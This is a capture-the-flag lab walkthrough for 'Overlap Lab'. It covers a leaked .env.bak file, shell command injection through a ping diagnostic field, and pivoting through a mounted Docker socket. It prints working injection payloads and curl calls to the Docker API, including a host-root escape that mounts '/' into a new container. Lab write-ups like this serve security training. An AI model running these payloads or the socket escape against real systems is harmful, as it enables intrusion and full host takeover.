# Overlap Lab: Complete Solution Walkthrough

Welcome to the **Overlap Lab** solution walkthrough. This document outlines the step-by-step exploitation path for this multi-stage security challenge. 

Overlap Lab simulates a realistic infrastructure-focused security scenario consisting of a leaked backup, an authenticated web management portal, command injection, and a Docker socket pivoting path leading to host-level access.

> [!IMPORTANT]
> To preserve the challenge experience, all actual flag values have been redacted and replaced with placeholders (e.g., `VulnOS{flag_placeholder}`).

---

## Phase 1: Finding Exposed Secrets in Public Files

### Vulnerability Analysis
During reconnaissance or web directory brute-forcing, we look for common backup extensions or configuration files left behind by developers. 

In [app.py](file:///c:/Users/sendt/Downloads/overlap-lab-main/overlap-lab-main/app/app.py#L45-L47), we find a dedicated route:
```python
@app.route("/.env.bak")
def leaked_backup():
    return send_from_directory(app.static_folder or "/app/static", ".env.bak", mimetype="text/plain")
```
This route serves the static backup file `.env.bak` directly to any unauthenticated requester.

### Exploitation Steps
1. Navigate to the web application's root URL followed by `/.env.bak` (e.g., `http://<TARGET_IP>/.env.bak` or `http://localhost/.env.bak` if running locally).
2. The server responds with the contents of the backup file:
   ```env
   # auto-generated at startup — do not store real secrets in VCS
   DEV_PORTAL_TOKEN=S3cur3_Dev_XXXXXX
   PHASE1_FLAG=VulnOS_PHASE_1_SECRET
   ```

### Findings
* **Phase 1 Flag**: `VulnOS{PHASE1_FLAG_REDACTED}`
* **Portal Token**: `S3cur3_Dev_XXXXXX` (Save this for Phase 2)

---

## Phase 2: Command Injection in Ping Diagnostic Tool

### Vulnerability Analysis
With the `DEV_PORTAL_TOKEN` retrieved in Phase 1, we can log in at `/login`. This sets `session["authed"] = True` and redirects us to the administrative dashboard at `/portal`.

In [app.py](file:///c:/Users/sendt/Downloads/overlap-lab-main/overlap-lab-main/app/app.py#L75-L91), when `LAB_MODE` is set to `vulnerable` (defined in [docker-compose.vuln.yml](file:///c:/Users/sendt/Downloads/overlap-lab-main/overlap-lab-main/docker-compose.vuln.yml#L5)), the ping tool executes command strings directly inside a shell:
```python
target = request.form.get("ip", "").strip()
if LAB_MODE == "vulnerable":
    # Original vulnerable behavior: passed directly into a shell
    command = f"ping -c 1 {target}"
    try:
        output = subprocess.check_output(
            command,
            shell=True,
            text=True,
            stderr=subprocess.STDOUT,
            timeout=8,
        )
```
Because `shell=True` is active and the input is not sanitized, shell metacharacters (like `;`, `&&`, `||`, or `|`) allow us to run arbitrary shell commands with the privileges of the web application user (`appuser`).

### Exploitation Steps
1. Access the diagnostic tool at `/portal`.
2. Input a payload in the **Target** field that appends a command to read the Phase 2 flag located at `/app/flags/phase2.txt`.
3. Submit the form with one of the following payloads:
   * `127.0.0.1; cat /app/flags/phase2.txt`
   * `127.0.0.1 && cat /app/flags/phase2.txt`
4. The output of the `cat` command will be rendered in the diagnostic response block on the page.

### Findings
* **Phase 2 Flag**: `VulnOS{PHASE2_FLAG_REDACTED}`

---

## Phase 3: Container Pivoting via Mounted Docker Socket

### Vulnerability Analysis
In [docker-compose.vuln.yml](file:///c:/Users/sendt/Downloads/overlap-lab-main/overlap-lab-main/docker-compose.vuln.yml#L6-L7), we notice the Docker daemon socket is mounted inside the web container:
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:ro
```
This is a common configuration for containers that need to monitor or interact with Docker services. However, exposing the Docker socket inside a container is extremely high risk. 

> [!NOTE]
> **Why does `:ro` (Read-Only) not block us?**
> Mounting a Unix domain socket with the `:ro` flag only prevents deleting or replacing the socket file path inside the container. It **does not** restrict the bidirectional read/write operations (sending and receiving stream packets) over the active socket channel. An attacker can still send arbitrary HTTP/API requests directly to the host's Docker daemon.

### Exploitation Steps
Since `curl` is pre-installed in the Flask container (see [Dockerfile](file:///c:/Users/sendt/Downloads/overlap-lab-main/overlap-lab-main/app/Dockerfile#L9)), we can utilize the Command Injection vulnerability from Phase 2 to run `curl` queries against the Docker API socket `/var/run/docker.sock`.

#### Step 1: List Containers
We query the Docker API to discover other running containers in the network:
```bash
127.0.0.1; curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```
The response returns JSON listing the active containers. We find:
* **Container Name**: `overlap-flag-vault`
* **Container Name**: `overlap-hostroot-seed`

#### Step 2: Access the Flag Vault Container
To access the Phase 3 flag in the isolated `overlap-flag-vault` container, we use the **Docker Exec API**. This is a two-step process:

1. **Create an Exec Instance**:
   We send a `POST` request to create an execution configuration to read `/vault/phase3.txt`:
   ```bash
   127.0.0.1; curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/vault/phase3.txt"]}' http://localhost/containers/overlap-flag-vault/exec
   ```
   **Response**:
   ```json
   {"Id":"<EXEC_ID_HASH>"}
   ```

2. **Start the Exec Instance**:
   We trigger the execution of the instance using the returned `<EXEC_ID_HASH>` to view the output:
   ```bash
   127.0.0.1; curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Detach": false, "Tty": false}' http://localhost/exec/<EXEC_ID_HASH>/start
   ```
   This command prints the flag.

### Findings
* **Phase 3 Flag**: `VulnOS{PHASE3_FLAG_REDACTED}`

---

## Phase 4: Accessing Host-Level Files (Simulated Host Root)

### Vulnerability Analysis
The Docker socket represents a complete delegation of root-level power over the host system. Once an attacker can speak to `/var/run/docker.sock`, they can pivot to the host filesystem.

In this lab, the host environment is simulated via the `overlap-hostroot-seed` container which hosts the `hostroot-data` volume containing `root.txt`. However, a true host escape on a standard Linux platform using this Docker socket is equally trivial.

### Exploitation Steps
There are two primary methods to read the simulated host root flag:

#### Method A: Pivoting via Exec (Simplest)
Similar to Phase 3, we can execute commands inside the `overlap-hostroot-seed` container which mounts the simulated host filesystem volume at `/rootfs`.

1. **Create Exec Instance on `overlap-hostroot-seed`**:
   ```bash
   127.0.0.1; curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/rootfs/root/root.txt"]}' http://localhost/containers/overlap-hostroot-seed/exec
   ```
   **Response**:
   ```json
   {"Id":"<EXEC_ID_HASH_2>"}
   ```

2. **Start the Exec Instance**:
   ```bash
   127.0.0.1; curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Detach": false, "Tty": false}' http://localhost/exec/<EXEC_ID_HASH_2>/start
   ```

#### Method B: Spawning a Host-Mounting Escape Container (Real-World Host Escape)
If this were a live server and we wanted to access the host's actual root disk (`/` on the physical/VM host), we could issue a command to the Docker API to spawn a new container that mounts the host's root filesystem directly:

1. **Create a new container that mounts the host's root directory (`/`) to `/host`**:
   ```bash
   127.0.0.1; curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image": "alpine:3.20", "Cmd": ["cat", "/host/root/root.txt"], "HostConfig": {"Binds": ["/:/host"]}}' http://localhost/containers/create?name=escape-helper
   ```
   **Response**:
   ```json
   {"Id":"<NEW_CONTAINER_ID>"}
   ```

2. **Start the new container to execute the payload**:
   ```bash
   127.0.0.1; curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape-helper/start
   ```

3. **Get the container logs to retrieve the flag**:
   ```bash
   127.0.0.1; curl --unix-socket /var/run/docker.sock http://localhost/containers/escape-helper/logs?stdout=true
   ```

### Findings
* **Simulated Host Root Flag**: `VulnOS{HOSTROOT_FLAG_REDACTED}`
